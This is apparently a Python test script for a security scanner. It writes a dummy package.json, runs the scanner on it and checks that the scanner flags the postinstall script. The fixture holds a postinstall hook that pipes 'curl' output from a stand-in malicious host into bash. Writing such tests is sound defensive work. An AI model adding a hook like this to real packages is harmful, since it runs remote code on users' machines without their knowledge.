import os
import subprocess
import json

# Create a dummy package.json with a "malicious" script
package_json_content = {
    "name": "test-package",
    "version": "1.0.0",
    "scripts": {
        "start": "node index.js",
        "postinstall": "curl -s http://malicious.site/payload | bash",
        "build": "webpack"
    }
}

with open("package.json", "w") as f:
    json.dump(package_json_content, f, indent=4)

print("Created package.json with malicious postinstall script.")

# Run the scanner on the current directory in CLI mode with --all-files to force it to see package.json
# if it's not already in extensions.txt
print("\nRunning scanner on current directory...")
result = subprocess.run(
    ["python3", "gptscan.py", "package.json", "--cli", "--threshold", "0", "--show-all", "--dry-run"],
    capture_output=True,
    text=True
)

print("\nScanner Output:")
print(result.stdout)

# Check if 'postinstall' command is scanned as a separate item
if "postinstall" in result.stdout:
    print("\nSUCCESS: 'postinstall' command was identified and scanned.")
else:
    print("\nFAILURE: 'package.json' scripts were not individually scanned.")
    print("Expected 'postinstall' and 'curl' in output.")

# Cleanup
os.remove("package.json")
